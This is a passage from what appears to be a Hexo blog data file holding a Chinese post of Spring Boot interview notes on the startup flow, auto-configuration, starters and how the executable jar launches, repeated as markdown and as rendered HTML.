<version>2.0.6.RELEASE</version>\n</dependency>\n```\n在进行构建期间，所有其他依赖项将自动添加到项目中。\n\n另一个很好的例子就是测试库。我们通常使用Spring Test，JUnit，Hamcrest和Mockito库。在Spring项目中，我们应该将所有这些库添加为依赖项。但是在Spring Boot中，我们只需要添加spring-boot-starter-test依赖项来自动包含这些库。\n\nspring在运行前需要使用xml文件做很多配置，而springboot帮我们实现了这些配置的自动加载，基于注解和简单的yml配置即可\n\nspring的web程序还是打包为war然后再Tomcat里运行，而springboot内嵌了Tomcat直接打成可运行的jar\n\n## Spring Boot 可执行 Jar 包运行原理\nSpring Boot 有一个很方便的功能就是可以将应用打成可执行的 Jar。那么大家有没想过这个 Jar 是怎么运行起来的呢？本篇博客就来介绍下 Spring Boot 可执行 Jar 包的运行原理。\n\n### 打可执行 Jar 包\n将 Spring Boot 应用打成可执行 Jar包很容易，只需要在 pom 中加上一个 Spring Boot 提供的插件，然后在执行mvn package即可\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n```\n运行完mvn package后，我们会在 target 目录下看到两个 jar 文件。myproject-0.0.1-SNAPSHOT.jar 和 myproject-0.0.1-SNAPSHOT.jar.original。第一个 jar 文件就是我们应用的可执行 jar 包，第二个 Jar 文件是应用原始的 jar 包。\n\n### 可执行 Jar 包内部结构\n```text\n可执行 jar 目录结构\n├─BOOT-INF\n│  ├─classes\n│  └─lib\n├─META-INF\n│  ├─maven\n│  ├─app.properties\n│  ├─MANIFEST.MF      \n└─org\n    └─springframework\n        └─boot\n            └─loader\n                ├─archive\n                ├─data\n                ├─jar\n                └─util\n\n```\n我们先来重点关注两个地方：META-INF 下面的 Jar 包描述文件和 BOOT-INF 这个目录。\n```properties\nManifest-Version: 1.0\nArchiver-Version: Plexus Archiver\nBuilt-By: xxxx\nStart-Class: com.xxxx.AppServer\nSpring-Boot-Classes: BOOT-INF/classes/\nSpring-Boot-Lib: BOOT-INF/lib/\nSpring-Boot-Version: 2.1.6.RELEASE\nCreated-By: Apache Maven 3.3.9\nBuild-Jdk: 1.8.0_73\nMain-Class: org.springframework.boot.loader.JarLauncher\n\n```\n在上面我们看到一个熟悉的配置Main-Class: org.springframework.boot.loader.JarLauncher。我们大概能猜到这个类是整个系统的入口。\n\n再看下 BOOT-INF 这个目录下面，我们会发现里面是我们项目打出来的 class 文件和项目依赖的 Jar 包。看到这里，你可能已经猜到 Spring Boot 是怎么启动项目的了。\n\n### JarLauncher\n```java\npublic class JarLauncher extends ExecutableArchiveLauncher {\n\n\tstatic final String BOOT_INF_CLASSES = \"BOOT-INF/classes/\";\n\n\tstatic final String BOOT_INF_LIB = \"BOOT-INF/lib/\";\n\n\tpublic JarLauncher() {\n\t}\n\n\tprotected JarLauncher(Archive archive) {\n\t\tsuper(archive);\n\t}\n\n\t@Override\n\tprotected boolean isNestedArchive(Archive.Entry entry) {\n\t\tif (entry.isDirectory()) {\n\t\t\treturn entry.getName().equals(BOOT_INF_CLASSES);\n\t\t}\n\t\treturn entry.getName().startsWith(BOOT_INF_LIB);\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n        //项目入口，重点在launch这个方法中\n\t\tnew JarLauncher().launch(args);\n\t}\n\n}\n\n```\n```java\n//launch方法\nprotected void launch(String[] args) throws Exception {\n    JarFile.registerUrlProtocolHandler();\n    //创建LaunchedURLClassLoader。如果根类加载器和扩展类加载器没有加载到某个类的话，就会通过LaunchedURLClassLoader这个加载器来加载类。这个加载器会从Boot-INF下面的class目录和lib目录下加载类。\n    ClassLoader classLoader = createClassLoader(getClassPathArchives());\n    //这个方法会读取jar描述文件中的Start-Class属性，然后通过反射调用到这个类的main方法。\n    launch(args, getMainClass(), classLoader);\n}\n\n```\n简单总结\n- Spring Boot 可执行 Jar 包的入口点是 JarLauncher 的 main 方法；\n- 这个方法的执行逻辑是先创建一个 LaunchedURLClassLoader，这个加载器加载类的逻辑是：先判断根类加载器和扩展类加载器能否加载到某个类，如果都加载不到就从 Boot-INF 下面的 class 和 lib 目录下去加载；\n- 读取Start-Class属性，通过反射机制调用启动类的 main 方法，这样就顺利调用到我们开发的 Spring Boot 主启动类的 main 方法了。\n\n","source":"_posts/Springboot最热点面试题.md","raw":"---\ntitle: Springboot最热点面试题\ndate: 2024-05-26 22:50:22\ntags: springboot\ncategories: 面试\n---\n\n\n\n\n## springboot启动流程\n### 启动类上注解：@SpringBootApplication\n#### @SpringBootConfiguration\n根据Javadoc可知，该注解作用就是将当前的类作为一个JavaConfig，然后触发注解@EnableAutoConfiguration和@ComponentScan的处理，本质上与@Configuration注解没有区别\n#### @EnableAutoConfiguration\n@EnableAutoConfiguration:实现自动装配的核心注解\n- @AutoConfigurationPackage\n    - 注册当前启动类的根 package\n    - 注册 org.springframework.boot.autoconfigure.AutoConfigurationPackages 的 BeanDefinition\n- @Import(AutoConfigurationImportSelector.class)\n    - 自动装配核心功能的实现实际是通过 AutoConfigurationImportSelector(加载自动装配类)类\n    - AutoConfigurationImportSelector 类实现了 ImportSelector接口\n        - 实现了这个接口中的 selectImports方法\n            - 方法实现 重要的getAutoConfigurationEntry()方法\n                1. 判断自动装配是否打开，默认是true可以通过application.yml设置\n                2. 获取@EnableAutoConfiguration里的exclude和excludeName内容以便排除\n                3. 获取需要自动装配的所有配置类，读取META-INF/spring.factories druid 数据库连接池的 Spring Boot Starter 就创建了META-INF/spring.factories文件\n                4. 筛选满足@ConditionalOnXXX注解的类，生效才会被加载\n            - 该方法主要用于获取所有符合条件的类的全限定类名，这些类需要被加载到 IoC 容器中\n#### @ComponentScan\n扫描的 Spring 对应的组件，如 @Componet，@Repository\n- 我们可以通过 basePackages 等属性来细粒度的定制 @ComponentScan 自动扫描的范围，如果不指定，则默认Spring框架实现会从声明 @ComponentScan 所在类的package进行扫描，所以 SpringBoot 的启动类最好是放在根package下，我们自定义的类就放在对应的子package下，这样就可以不指定 basePackages\n### 启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class<?>, java.lang.String...)\n- 从spring.factories配置文件中加载EventPublishingRunListener对象，该对象拥有SimpleApplicationEventMulticaster属性，即在SpringBoot启动过程的不同阶段用来发射内置的生命周期事件;\n    - spring-bean包下META-INF/spring.factories\n- 准备环境变量，包括系统变量，环境变量，命令行参数，默认变量，servlet相关配置变量，随机值以及配置文件（比如application.properties）等;\n    - 而后就会去创建Environment——这个时候会去加载application配置文件\n- 控制台打印SpringBoot的bannner标志；\n- 根据不同类型环境创建不同类型的applicationcontext容器，因为这里是servlet环境，所以创建的是AnnotationConfigServletWebServerApplicationContext容器对象；\n- 从spring.factories配置文件中加载FailureAnalyzers对象,用来报告SpringBoot启动过程中的异常；\n- 为刚创建的容器对象做一些初始化工作，准备一些容器属性值等，对ApplicationContext应用一些相关的后置处理和调用各个ApplicationContextInitializer的初始化方法来执行一些初始化逻辑等；\n- 刷新容器，这一步至关重要。比如调用bean factory的后置处理器，注册BeanPostProcessor后置处理器，初始化事件广播器且广播事件，初始化剩下的单例bean和SpringBoot创建内嵌的Tomcat服务器等等重要且复杂的逻辑都在这里实现，主要步骤可见代码的注释，关于这里的逻辑会在以后的spring源码分析专题详细分析；\n    - // 1）在context刷新前做一些准备工作，比如初始化一些属性设置，属性合法性校验和保存容器中的一些早期事件等；\n    - // 2）让子类刷新其内部bean factory,注意SpringBoot和Spring启动的情况执行逻辑不一样\n    - // 3）对bean factory进行配置，比如配置bean factory的类加载器，后置处理器等\n    - // 4）完成bean factory的准备工作后，此时执行一些后置处理逻辑，子类通过重写这个方法来在BeanFactory创建并预准备完成以后做进一步的设置\n        - // 在这一步，所有的bean definitions将会被加载，但此时bean还不会被实例化\n    - // 5）执行BeanFactoryPostProcessor的方法即调用bean factory的后置处理器：\n        - // BeanDefinitionRegistryPostProcessor（触发时机：bean定义注册之前）和BeanFactoryPostProcessor（触发时机：bean定义注册之后bean实例化之前）\n    - // 6）注册bean的后置处理器BeanPostProcessor，注意不同接口类型的BeanPostProcessor；在Bean创建前后的执行时机是不一样的\n    - // 7）初始化国际化MessageSource相关的组件，比如消息绑定，消息解析等\n    - // 8）初始化事件广播器，如果bean factory没有包含事件广播器，那么new一个SimpleApplicationEventMulticaster广播器对象并注册到bean factory中\n    - // 9）AbstractApplicationContext定义了一个模板方法onRefresh，留给子类覆写，比如ServletWebServerApplicationContext覆写了该方法来创建内嵌的tomcat容器\n    - // 10）注册实现了ApplicationListener接口的监听器，之前已经有了事件广播器，此时就可以派发一些early application events\n    - // 11）完成容器bean factory的初始化，并初始化所有剩余的单例bean。这一步非常重要，一些bean postprocessor会在这里调用。\n    - // 12）完成容器的刷新工作，并且调用生命周期处理器的onRefresh()方法，并且发布ContextRefreshedEvent事件\n- 执行刷新容器后的后置处理逻辑，注意这里为空方法；\n- 调用ApplicationRunner和CommandLineRunner的run方法，我们实现这两个接口可以在spring容器启动后需要的一些东西比如加载一些业务数据等;\n- 报告启动异常，即若启动过程中抛出异常，此时用FailureAnalyzers来报告异常;\n- 最终返回容器对象，这里调用方法没有声明对象来接收。\n```java\npublic static void main(String[] args) throws Exception {\n   SpringApplication.run(new Class<?>[0], args);\n}\npublic static ConfigurableApplicationContext run(Class<?>[] primarySources, String[] args) {\n   // 新建SpringApplication对象，再调用run方法\n   return new SpringApplication(primarySources).run(args);\n}\npublic ConfigurableApplicationContext run(String... args) {\n   // stopWatch用于统计run启动过程时长\n   StopWatch stopWatch = new StopWatch();\n   // 开始计时\n   stopWatch.start();\n   // 创建ConfigurableApplicationContext对象\n   ConfigurableApplicationContext context = null;\n   // exceptionReporters集合用来存储SpringApplication启动过程的异常，SpringBootExceptionReporter且通过spring.factories方式来加载\n   Collection<SpringBootExceptionReporter> exceptionReporters = new ArrayList<>();\n   // 配置headless属性\n   configureHeadlessProperty();\n   /**\n    * 从spring.factories配置文件中加载到EventPublishingRunListener对象并赋值给SpringApplicationRunListeners\n    * # Run Listeners\n    * org.springframework.boot.SpringApplicationRunListener=\\\n    * org.springframework.boot.context.event.EventPublishingRunListener\n    */\n   SpringApplicationRunListeners listeners = getRunListeners(args);\n   // 启动SpringApplicationRunListeners监听\n   listeners.starting();\n   try {\n      // 创建ApplicationArguments对象，封装了args参数\n      ApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\n      // 备配置参数有app.properties，外部配置参数比如jvm启动参数等\n      ConfigurableEnvironment environment = prepareEnvironment(listeners, applicationArguments);\n      // 配置spring.beaninfo.ignore属性\n      configureIgnoreBeanInfo(environment);\n      // 打印springboot的bannner\n      Banner printedBanner = printBanner(environment);\n      // 根据不同类型创建不同类型的spring applicationcontext容器\n      context = createApplicationContext();\n      /**\n       * 异常报告\n       * 从spring.factories配置文件中加载exceptionReporters，其中ConfigurableApplicationContext.class作为FailureAnalyzers构造方法的参数\n       * # Error Reporters\n       * org.springframework.boot.SpringBootExceptionReporter=\\\n       * org.springframework.boot.diagnostics.FailureAnalyzers\n       */\n      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class,\n            new Class[] { ConfigurableApplicationContext.class }, context);\n      // 准备容器事项：调用各个ApplicationContextInitializer的initialize方法\n      // 和触发SpringApplicationRunListeners的contextPrepared及contextLoaded方法等\n      prepareContext(context, environment, listeners, applicationArguments, printedBanner);\n      // 刷新容器，这一步至关重要\n      refreshContext(context);\n      // 执行刷新容器后的后置处理逻辑，注意这里为空方法\n      afterRefresh(context, applicationArguments);\n      // 停止stopWatch计时\n      stopWatch.stop();\n      // 打印springboot的启动时常\n      if (this.logStartupInfo) {\n         new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);\n      }\n      // 触发SpringApplicationRunListener的started方法，通知spring容器已经启动\n      listeners.started(context);\n      // 调用ApplicationRunner和CommandLineRunner的run方法，实现spring容器启动后需要做的一些东西\n      callRunners(context, applicationArguments);\n   }\n   // 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。\n   catch (Throwable ex) {\n      handleRunFailure(context, ex, exceptionReporters, listeners);\n      throw new IllegalStateException(ex);\n   }\n\n   try {\n      // 当容器刷新完毕等，触发SpringApplicationRunListeners数组的running方法\n      listeners.running(context);\n   }\n   catch (Throwable ex) {\n      // 若上面的方法抛出异常，将异常添加到exceptionReporters集合中，并抛出 IllegalStateException 异常。\n      handleRunFailure(context, ex, exceptionReporters, null);\n      throw new IllegalStateException(ex);\n   }\n   return context;\n}\n\n```\n## 怎么让Spring把Body变成一个对象\n- @RequestBody注解原理\n- 详细看springmvc的处理流程\n## SpringBoot的starter实现原理是什么？\n原理就是因为在@EnableAutoConfiguration注解，会自动的扫描jar包下的META-INF/spring.factories文件的配置类，写在这里面的类都是需要被自动加载的\n\n将configuration类中定义的bean加入spring到容器中。就相当于加载之前我们自己配置组件的xml文件。而现在SpringBoot自己定义了一个默认的值，然后直接加载进入了Spring容器。\n\nSpringBoot提供的自动配置依赖模块都以spring-boot-starter-为命名前缀，并且这些依赖都在org.springframework.boot下。 所有的spring-boot-starter都有约定俗成的默认配置，但允许调整这些配置调整默认的行为。\n## spring 和springboot的区别\nSpring Boot基本上是Spring框架的扩展，它消除了设置Spring应用程序所需的XML配置，为更快，更高效的开发生态系统铺平了道路。\n\nSpring Boot中的一些特征：\n\n- 创建独立的Spring应用。\n- 嵌入式Tomcat、Jetty、 Undertow容器（无需部署war文件）。\n- 提供的starters 简化构建配置\n- 尽可能自动配置spring应用。\n- 提供生产指标,例如指标、健壮检查和外部化配置\n- 完全没有代码生成和XML配置要求\n\nMaven依赖\n\n首先，让我们看一下使用Spring创建Web应用程序所需的最小依赖项\n```xml\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-web</artifactId>\n    <version>5.1.0.RELEASE</version>\n</dependency>\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-webmvc</artifactId>\n    <version>5.1.0.RELEASE</version>\n</dependency>\n```\n与Spring不同，Spring Boot只需要一个依赖项来启动和运行Web应用程序：\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-web</artifactId>\n    <version>2.0.6.RELEASE</version>\n</dependency>\n```\n在进行构建期间，所有其他依赖项将自动添加到项目中。\n\n另一个很好的例子就是测试库。我们通常使用Spring Test，JUnit，Hamcrest和Mockito库。在Spring项目中，我们应该将所有这些库添加为依赖项。但是在Spring Boot中，我们只需要添加spring-boot-starter-test依赖项来自动包含这些库。\n\nspring在运行前需要使用xml文件做很多配置，而springboot帮我们实现了这些配置的自动加载，基于注解和简单的yml配置即可\n\nspring的web程序还是打包为war然后再Tomcat里运行，而springboot内嵌了Tomcat直接打成可运行的jar\n\n## Spring Boot 可执行 Jar 包运行原理\nSpring Boot 有一个很方便的功能就是可以将应用打成可执行的 Jar。那么大家有没想过这个 Jar 是怎么运行起来的呢？本篇博客就来介绍下 Spring Boot 可执行 Jar 包的运行原理。\n\n### 打可执行 Jar 包\n将 Spring Boot 应用打成可执行 Jar包很容易，只需要在 pom 中加上一个 Spring Boot 提供的插件，然后在执行mvn package即可\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n```\n运行完mvn package后，我们会在 target 目录下看到两个 jar 文件。myproject-0.0.1-SNAPSHOT.jar 和 myproject-0.0.1-SNAPSHOT.jar.original。第一个 jar 文件就是我们应用的可执行 jar 包，第二个 Jar 文件是应用原始的 jar 包。\n\n### 可执行 Jar 包内部结构\n```text\n可执行 jar 目录结构\n├─BOOT-INF\n│  ├─classes\n│  └─lib\n├─META-INF\n│  ├─maven\n│  ├─app.properties\n│  ├─MANIFEST.MF      \n└─org\n    └─springframework\n        └─boot\n            └─loader\n                ├─archive\n                ├─data\n                ├─jar\n                └─util\n\n```\n我们先来重点关注两个地方：META-INF 下面的 Jar 包描述文件和 BOOT-INF 这个目录。\n```properties\nManifest-Version: 1.0\nArchiver-Version: Plexus Archiver\nBuilt-By: xxxx\nStart-Class: com.xxxx.AppServer\nSpring-Boot-Classes: BOOT-INF/classes/\nSpring-Boot-Lib: BOOT-INF/lib/\nSpring-Boot-Version: 2.1.6.RELEASE\nCreated-By: Apache Maven 3.3.9\nBuild-Jdk: 1.8.0_73\nMain-Class: org.springframework.boot.loader.JarLauncher\n\n```\n在上面我们看到一个熟悉的配置Main-Class: org.springframework.boot.loader.JarLauncher。我们大概能猜到这个类是整个系统的入口。\n\n再看下 BOOT-INF 这个目录下面，我们会发现里面是我们项目打出来的 class 文件和项目依赖的 Jar 包。看到这里，你可能已经猜到 Spring Boot 是怎么启动项目的了。\n\n### JarLauncher\n```java\npublic class JarLauncher extends ExecutableArchiveLauncher {\n\n\tstatic final String BOOT_INF_CLASSES = \"BOOT-INF/classes/\";\n\n\tstatic final String BOOT_INF_LIB = \"BOOT-INF/lib/\";\n\n\tpublic JarLauncher() {\n\t}\n\n\tprotected JarLauncher(Archive archive) {\n\t\tsuper(archive);\n\t}\n\n\t@Override\n\tprotected boolean isNestedArchive(Archive.Entry entry) {\n\t\tif (entry.isDirectory()) {\n\t\t\treturn entry.getName().equals(BOOT_INF_CLASSES);\n\t\t}\n\t\treturn entry.getName().startsWith(BOOT_INF_LIB);\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n        //项目入口，重点在launch这个方法中\n\t\tnew JarLauncher().launch(args);\n\t}\n\n}\n\n```\n```java\n//launch方法\nprotected void launch(String[] args) throws Exception {\n    JarFile.registerUrlProtocolHandler();\n    //创建LaunchedURLClassLoader。如果根类加载器和扩展类加载器没有加载到某个类的话，就会通过LaunchedURLClassLoader这个加载器来加载类。这个加载器会从Boot-INF下面的class目录和lib目录下加载类。\n    ClassLoader classLoader = createClassLoader(getClassPathArchives());\n    //这个方法会读取jar描述文件中的Start-Class属性，然后通过反射调用到这个类的main方法。\n    launch(args, getMainClass(), classLoader);\n}\n\n```\n简单总结\n- Spring Boot 可执行 Jar 包的入口点是 JarLauncher 的 main 方法；\n- 这个方法的执行逻辑是先创建一个 LaunchedURLClassLoader，这个加载器加载类的逻辑是：先判断根类加载器和扩展类加载器能否加载到某个类，如果都加载不到就从 Boot-INF 下面的 class 和 lib 目录下去加载；\n- 读取Start-Class属性，通过反射机制调用启动类的 main 方法，这样就顺利调用到我们开发的 Spring Boot 主启动类的 main 方法了。\n\n","slug":"Springboot最热点面试题","published":1,"updated":"2024-05-26T14:53:55.031Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ry5000obsuh5ddh97pl","content":"<h2 id=\"springboot启动流程\"><a href=\"#springboot启动流程\" class=\"headerlink\" title=\"springboot启动流程\"></a>springboot启动流程</h2><h3 id=\"启动类上注解：-SpringBootApplication\"><a href=\"#启动类上注解：-SpringBootApplication\" class=\"headerlink\" title=\"启动类上注解：@SpringBootApplication\"></a>启动类上注解：@SpringBootApplication</h3><h4 id=\"SpringBootConfiguration\"><a href=\"#SpringBootConfiguration\" class=\"headerlink\" title=\"@SpringBootConfiguration\"></a>@SpringBootConfiguration</h4><p>根据Javadoc可知，该注解作用就是将当前的类作为一个JavaConfig，然后触发注解@EnableAutoConfiguration和@ComponentScan的处理，本质上与@Configuration注解没有区别</p>\n<h4 id=\"EnableAutoConfiguration\"><a href=\"#EnableAutoConfiguration\" class=\"headerlink\" title=\"@EnableAutoConfiguration\"></a>@EnableAutoConfiguration</h4><p>@EnableAutoConfiguration:实现自动装配的核心注解</p>\n<ul>\n<li>@AutoConfigurationPackage<ul>\n<li>注册当前启动类的根 package</li>\n<li>注册 org.springframework.boot.autoconfigure.AutoConfigurationPackages 的 BeanDefinition</li>\n</ul>\n</li>\n<li>@Import(AutoConfigurationImportSelector.class)<ul>\n<li>自动装配核心功能的实现实际是通过 AutoConfigurationImportSelector(加载自动装配类)类</li>\n<li>AutoConfigurationImportSelector 类实现了 ImportSelector接口<ul>\n<li>实现了这个接口中的 selectImports方法<ul>\n<li>方法实现 重要的getAutoConfigurationEntry()方法<ol>\n<li>判断自动装配是否打开，默认是true可以通过application.yml设置</li>\n<li>获取@EnableAutoConfiguration里的exclude和excludeName内容以便排除</li>\n<li>获取需要自动装配的所有配置类，读取META-INF&#x2F;spring.factories druid 数据库连接池的 Spring Boot Starter 就创建了META-INF&#x2F;spring.factories文件</li>\n<li>筛选满足@ConditionalOnXXX注解的类，生效才会被加载</li>\n</ol>\n</li>\n<li>该方法主要用于获取所有符合条件的类的全限定类名，这些类需要被加载到 IoC 容器中</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"ComponentScan\"><a href=\"#ComponentScan\" class=\"headerlink\" title=\"@ComponentScan\"></a>@ComponentScan</h4><p>扫描的 Spring 对应的组件，如 @Componet，@Repository</p>\n<ul>\n<li>我们可以通过 basePackages 等属性来细粒度的定制 @ComponentScan 自动扫描的范围，如果不指定，则默认Spring框架实现会从声明 @ComponentScan 所在类的package进行扫描，所以 SpringBoot 的启动类最好是放在根package下，我们自定义的类就放在对应的子package下，这样就可以不指定 basePackages</li>\n</ul>\n<h3 id=\"启动类中的main方法：org-springframework-boot-SpringApplication-run-java-lang-Class-java-lang-String…\"><a href=\"#启动类中的main方法：org-springframework-boot-SpringApplication-run-java-lang-Class-java-lang-String…\" class=\"headerlink\" title=\"启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class&lt;?&gt;, java.lang.String…)\"></a>启动类中的main方法：org.springframework.boot.SpringApplication#run(java.lang.Class&lt;?&gt;, java.lang.String…)</h3><ul>\n<li>从spring.factories配置文件中加载EventPublishingRunListener对象，该对象拥有SimpleApplicationEventMulticaster属性，即在SpringBoot启动过程的不同阶段用来发射内置的生命周期事件;<ul>\n<li>spring-bean包下META-INF&#x2F;spring.factories</li>\n</ul>\n</li>\n<li>准备环境变量，包括系统变量，环境变量，命令行参数，默认变量，servlet相关配置变量，随机值以及配置文件（比如application.properties）等;<ul>\n<li>而后就会去创建Environment——这个时候会去加载application配置文件</li>\n</ul>\n</li>\n<li>控制台打印SpringBoot的bannner标志；</li>\n<li>根据不同类型环境创建不同类型的applicationcontext容器，因为这里是servlet环境，所以创建的是AnnotationConfigServletWebServerApplicationContext容器对象；</li>\n<li>从spring.factories配置文件中加载FailureAnalyzers对象,用来报告SpringBoot启动过程中的异常；</li>\n<li>为刚创建的容器对象做一些初始化工作，准备一些容器属性值等，对ApplicationContext应用一些相关的后置处理和调用各个ApplicationContextInitializer的初始化方法来执行一些初始化逻辑等；</li>\n<li>刷新容器，这一步至关重要。比如调用bean factory的后置处理器，注册BeanPostProcessor后置处理器，初始化事件广播器且广播事件，初始化剩下的单例bean和SpringBoot创建内嵌的Tomcat服务器等等重要且复杂的逻辑都在这里实现，主要步骤可见代码的注释，关于这里的逻辑会在以后的spring源码分析专题详细分析；<ul>\n<li>&#x2F;&#x2F; 1）在context刷新前做一些准备工作，比如初始化一些属性设置，属性合法性校验和保存容器中的一些早期事件等；</li>\n<li>&#x2F;&#x2F; 2）让子类刷新其内部bean factory,注意SpringBoot和Spring启动的情况执行逻辑不一样</li>\n<li>&#x2F;&#x2F; 3）对bean factory进行配置，比如配置bean factory的类加载器，后置处理器等</li>\n<li>&#x2F;&#x2F; 4）完成bean factory的准备工作后，此时执行一些后置处理逻辑，子类通过重写这个方法来在BeanFactory创建并预准备完成以后做进一步的设置<ul>\n<li>&#x2F;&#x2F; 在这一步，所有的bean definitions将会被加载，但此时bean还不会被实例化</li>\n</ul>\n</li>\n<li>&#x2F;&#x2F; 5）执行BeanFactoryPostProcessor的方法即调用bean factory的后置处理器：<ul>\n<li>&#x2F;&#x2F; BeanDefinitionRegistryPostProcessor（触发时机：bean定义注册之前）和BeanFactoryPostProcessor（触发时机：bean定义注册之后bean实例化之前）</li>\n</ul>\n</li>\n<li>&#x2F;&#x2F; 6）注册bean的后置处理器BeanPostProcessor，注意不同接口类型的BeanPostProcessor；在Bean创建前后的执行时机是不一样的</li>\n<li>&#x2F;&#x2F; 7）初始化国际化MessageSource相关的组件，比如消息绑定，消息解析等</li>\n<li>&#x2F;&#x2F; 8）初始化事件广播器，如果bean factory没有包含事件广播器，那么new一个SimpleApplicationEventMulticaster广播器对象并注册到bean factory中</li>\n<li>&#x2F;&#x2F; 9）AbstractApplicationContext定义了一个模板方法onRefresh，留给子类覆写，比如ServletWebServerApplicationContext覆写了该方法来创建内嵌的tomcat容器</li>\n<li>&#x2F;&#x2F; 10）注册实现了ApplicationListener接口的监听器，之前已经有了事件广播器，此时就可以派发一些early application events</li>\n<li>&#x2F;&#x2F; 11）完成容器bean factory的初始化，并初始化所有剩余的单例bean。这一步非常重要，一些bean postprocessor会在这里调用。</li>\n<li>&#x2F;&#x2F; 12）完成容器的刷新工作，并且调用生命周期处理器的onRefresh()方法，并且发布ContextRefreshedEvent事件</li>\n</ul>\n</li>\n<li>执行刷新容器后的后置处理逻辑，注意这里为空方法；</li>\n<li>调用ApplicationRunner和CommandLineRunner的run方法，我们实现这两个接口可以在spring容器启动后需要的一些东西比如加载一些业务数据等;</li>\n<li>报告启动异常，即若启动过程中抛出异常，此时用FailureAnalyzers来报告异常;</li>\n<li>最终返回容器对象，这里调用方法没有声明对象来接收。<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">   SpringApplication.run(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>&lt;?&gt;[<span class=\"number\">0</span>], args);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> ConfigurableApplicationContext <span class=\"title function_\">run</span><span class=\"params\">(Class&lt;?&gt;[] primarySources, String[] args)</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">// 新建SpringApplication对象，再调用run方法</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpringApplication</span>(primarySources).run(args);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> ConfigurableApplicationContext <span class=\"title function_\">run</span><span class=\"params\">(String... args)</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">// stopWatch用于统计run启动过程时长</span></span><br><span class=\"line\">   <span class=\"type\">StopWatch</span> <span class=\"variable\">stopWatch</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StopWatch</span>();</span><br><span class=\"line\">   <span class=\"comment\">// 开始计时</span></span><br><span class=\"line\">   stopWatch.start();</span><br><span class=\"line\">   <span class=\"comment\">// 创建ConfigurableApplicationContext对象</span></span><br><span class=\"line\">   <span class=\"type\">ConfigurableApplicationContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">   <span class=\"comment\">// exceptionReporters集合用来存储SpringApplication启动过程的异常，SpringBootExceptionReporter且通过spring.factories方式来加载</span></span><br><span class=\"line\">   Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">   <span class=\"comment\">// 配置headless属性</span></span><br><span class=\"line\">   configureHeadlessProperty();</span><br><span class=\"line\">   <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">    * 从spring.factories配置文件中加载到EventPublishingRunListener对象并赋值给SpringApplicationRunListeners</span></span><br><span class=\"line\"><span class=\"comment\">    * # Run Listeners</span></span><br><span class=\"line\"><span class=\"comment\">    * org.springframework.boot.SpringApplicationRunListener=\\</span></span><br><span class=\"line\"><span class=\"comment\">    * org.springframework.boot.context.event.EventPublishingRunListener</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">   <span class=\"type\">SpringApplicationRunListeners</span> <span class=\"variable\">listeners</span> <span class=\"operator\">=</span> getRunListeners(args);</span><br><span class=\"line\">   <span class=\"comment\">// 启动SpringApplicationRunListeners监听</span></span><br><span class=\"line\">   listeners.starting();</span><br><span class=\"line\">   <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 创建ApplicationArguments对象，封装了args参数</span></span><br><span class=\"line\">      <span class=\"type\">ApplicationArguments</span> <span class=\"variable\">applicationArguments</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DefaultApplicationArguments</span>(args);</span><br><span class=\"line\">      <span class=\"comment\">// 备配置参数有app.properties，外部配置参数比如jvm启动参数等</span></span><br><span class=\"line\">      <span class=\"type\">ConfigurableEnvironment</span> <span class=\"variable\">environment</span> <span class=\"operator\">=</span> prepareEnvironment(listeners, applicationArguments);</span><br><span class=\"line\">      <span class=\"comment\">// 配置spring.beaninfo.ignore属性</span></span><br><span class=\"line\">      configureIgnoreBeanInfo(environment);</span><br><span class=\"line\">      <span class=\"comment\">// 打印springboot的bannner</span></span><br><span class=\"line\">      <span class=\"type\">Banner</span> <span class=\"variable\">printedBanner</span> <span class=\"operator\">=</span> printBanner(environment);</span><br><span class=\"line\">      <span class=\"comment\">// 根据不同类型创建不同类型的spring applicationcontext容器</span></span><br><span class=\"line\">      context = createApplicationContext();</span><br><span class=\"line\">      <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">       * 异常报告</span></span><br><span class=\"line\"><span class=\"comment\">       * 